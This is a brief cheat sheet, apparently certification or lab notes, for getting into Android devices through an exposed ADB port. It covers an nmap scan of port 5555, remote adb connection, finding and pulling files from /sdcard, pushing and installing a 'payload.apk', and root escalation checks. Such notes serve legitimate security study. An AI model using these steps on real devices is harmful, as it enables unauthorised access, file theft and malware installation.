#### ADB
```bash
5555 port should be open if it is android
Nmap -p 5555 <ip>
Adb connect ip:5555
adb pull /sdcard/
Adb shell
Pwd -> ls -> cd sdcard -->   ls ->  cat secret.txt (if u can't find anything check in downloads)

search for file in shell
find /sdcard/ -name "*.jpg" -o -name "*.png" 
adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg
Note: we can in shell ls, cd, cat

# Basic device info
adb devices -l       # list devices with details
adb shell getprop    # get system properties (OS, model, etc.)
adb shell uname -a   # kernel info
adb shell cat /proc/version
adb shell id         # check current user privileges (root/non-root)

# File system navigation
adb shell ls /       # list root directory
adb shell pwd        # print working dir
adb shell cd /sdcard # move to SD card
adb shell ls -la     # detailed list

# File transfer
adb pull /sdcard/Download/file.txt ./   # copy file from device to PC
adb push ./payload.apk /sdcard/         # copy file from PC to device

# App management
adb shell pm list packages              # list installed packages
adb shell pm list packages -3           # list user-installed apps
adb shell pm path com.example.app       # get APK path
adb pull /data/app/com.example.app-1/base.apk ./  # extract APK
adb install payload.apk                 # install an APK
adb uninstall com.example.app           # uninstall an app

# Privilege escalation check
adb root      # restart adbd as root (works if device insecure)
adb remount   # remount system as read-write (if root)

```
